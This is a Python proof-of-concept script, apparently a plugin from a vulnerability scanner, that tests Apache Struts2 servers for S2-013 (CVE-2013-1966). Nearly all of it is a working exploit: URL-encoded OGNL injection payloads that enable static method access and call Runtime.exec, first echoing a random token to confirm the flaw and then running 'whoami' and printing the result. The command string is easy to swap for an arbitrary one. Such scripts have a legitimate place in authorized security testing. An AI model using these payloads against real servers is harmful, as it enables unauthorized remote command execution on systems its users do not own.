#!/usr/bin/env python3

'''
name: S2-013漏洞,又名CVE-2013-1966漏洞
description: S2-013漏洞可执行任意命令
'''
import sys
import time
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_013_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta() 
        self.check_payload =  '?a=%24%7B%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27' + urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8') + '%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'
        self.cmd_payload = '?a=%24%7B%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'
                                         
    def filter(self, check_str):
        temp = ''
        for i in check_str:
            if i != '\n' and i != '\x00':
                temp = temp + i
        return temp                

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            if  '.action' not in self.url:
                    self.url = self.url + '/link.action'
            check_url = self.url + self.check_payload
            check_res = request.get(check_url)
            check_str = self.filter(list(check_res.text))
            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
                cmd_url = self.url + self.cmd_payload
                cmd_res = request.get(cmd_url)
                cmd_str = self.filter(list(cmd_res.text))
                print ('存在S2-013漏洞,执行whoami命令成功，执行结果是:', cmd_str)
                return True
            else:
                #print('不存在S2-013漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_013 = S2_013_BaseVerify('http://192.168.30.242:8080')
    S2_013.run()